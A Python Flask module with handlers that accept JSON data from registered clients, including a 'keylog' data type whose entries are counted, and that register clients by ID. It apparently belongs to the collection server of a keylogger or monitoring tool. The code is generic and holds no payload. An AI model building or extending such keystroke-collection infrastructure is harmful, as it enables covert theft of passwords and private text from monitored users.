from flask import request, jsonify
from src.utils.helpers import format_response, save_debug_data
from src.handlers.data_handler import process_incoming_data
import logging

logger = logging.getLogger(__name__)

def handle_client_data(data_type):
    """
    Generic handler for incoming client data
    """
    try:
        # Get JSON data from request
        data = request.get_json()
        if not data:
            return format_response(False, "No data provided"), 400
        
        # Process the data based on type
        result = process_incoming_data(data, data_type)
        
        if 'error' in result:
            logger.error(f"Error processing {data_type} data: {result['error']}")
            return format_response(False, result['error']), 400
        
        # Save debug data if in debug mode
        if request.args.get('debug'):
            save_debug_data(data_type, data)
        
        logger.info(f"Successfully processed {data_type} data from client {data.get('client_id', 'unknown')}")
        return format_response(True, f"{data_type} data received successfully", {
            'entries_processed': len(data.get('entries', [])) if data_type == 'keylog' else 1
        }), 200
        
    except Exception as e:
        logger.exception(f"Error handling {data_type} data")
        return format_response(False, f"Internal server error: {str(e)}"), 500

def handle_client_registration():
    """
    Handle client registration requests
    """
    try:
        data = request.get_json()
        if not data or 'client_id' not in data:
            return format_response(False, "Client ID is required"), 400
        
        # In a real implementation, you might create a client record in the database here
        logger.info(f"Client registration received: {data['client_id']}")
        
        return format_response(True, "Client registered successfully", {
            'client_id': data['client_id']
        }), 200
        
    except Exception as e:
        logger.exception("Error handling client registration")
        return format_response(False, f"Internal server error: {str(e)}"), 500